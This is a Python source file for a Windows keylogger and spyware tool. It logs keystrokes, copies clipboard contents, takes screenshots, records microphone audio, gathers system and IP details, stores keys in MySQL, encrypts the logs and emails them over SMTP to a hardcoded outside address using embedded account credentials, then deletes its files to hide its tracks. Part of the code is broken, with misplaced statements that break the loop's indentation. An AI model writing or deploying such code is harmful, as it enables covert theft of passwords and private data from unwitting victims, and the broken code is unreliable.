# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import mysql.connector
import pynput
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime


keys_information = "logs.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "keylogcheck123@yahoo.com" # Enter disposable email here
password = "u8^T3m?7JYFPWR6"  # Enter email password here

username = getpass.getuser()

toaddr = "keylogcheck@walla.com"  # Enter the email address you want to send your information to

key = "ZXhPJM7HwdlzGHEcOFUYu-dj5emifg5FImE5wJd4RbI=" # Generate an encryption key from the Cryptography folder

file_path = "C:\projs\python keylogger"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend


#cnt = 0
#keys = []
hour = 0
istexist = False #is table exist
mydb = mysql.connector.connect(host = "localhost", user = "root", password = "admin", database = "mydatabase")
#print(mydb)
mycursor = mydb.cursor()
#mycursor.execute("CREATE DATABASE mydatabase")
#mycursor.execute("SHOW DATABASES")
#for x in mycursor:
    #print(x)



# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)



# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()



# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

#time_iteration = 15.0
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration



# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    counter = 0
    keys = []
    keys1 = []

    def on_press(key):
        #print("{0} pressed".format(key))
        global keys, keys1, counter, istexist, hour
        print(key)
        keys1.append(str(key))
        keys.append(key)
        datup = datetime.timetuple(datetime.now())
        currentTime = time.time()
        #print(datup)
        #print(datup.tm_min)
        #print(hour)
        counter += 1    
        #print(cnt)
        if counter >= 1:
            write_file(keys)
            counter = 0
            keys = []
        #print(istexist)
        if istexist == False:
            create_table()
            istexist = True
        if datup.tm_hour > hour:
            #print("hola")
            hour = datup.tm_hour
            add_todb(keys1)
            keys1 = []


    def on_release(key):
        if key == Key.esc: #stopping the recording of the keylogger when the esc key is released
            return False
        if currentTime > stoppingTime:
            return False


    def write_file(keys):
        #with open("keylogs.txt","a") as text:
            #for key in keys:
                #k = str(key).replace("'","")
                #if k.find("space") > 0: #replacing spaces in the text with a new line
                    #text.write('\n')
                #elif k.find("Key") == -1: #skipping (not writing in the text file) any key which is not a letter/number/sign (shift,control, etc...)
                    #text.write(k)
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0: #replacing spaces in the text with a new line
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1: #skipping (not writing in the text file) any key which is not a letter/number/sign (shift,control, etc...)
                    f.write(k)
                    f.close()


send_email(keys_information, file_path + extend + keys_information, toaddr)



    def add_todb(keys):
        global mydb, mycursor
    
        sql = "INSERT INTO keyls (datetime, lkeys) VALUES (%s, %s)"
        val = (str(datetime.now()), ' '.join(keys))
        mycursor.execute(sql, val)
        mydb.commit()
        mycursor.execute("SELECT * FROM keyls")

        myresult = mycursor.fetchall()
        for x in myresult:
            print(x)



    def create_table():
        global mydb, mycursor
        #mycursor.execute("SHOW DATABASES")
        #for x in mycursor:
            #print(x)

        #mycursor.execute("CREATE TABLE keyls (id INT AUTO_INCREMENT PRIMARY KEY, datetime VARCHAR(255), lkeys VARCHAR(255))")

   

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

    #print("ffpe,lp,pe", currentTime)
    #print("mfrmoemforeofr", stoppingTime)
    currentTime = time.time()
    #print("ffpe,lp,pe", currentTime)
    #print("mfrmoemforeofr", stoppingTime)
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration



# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
    
    
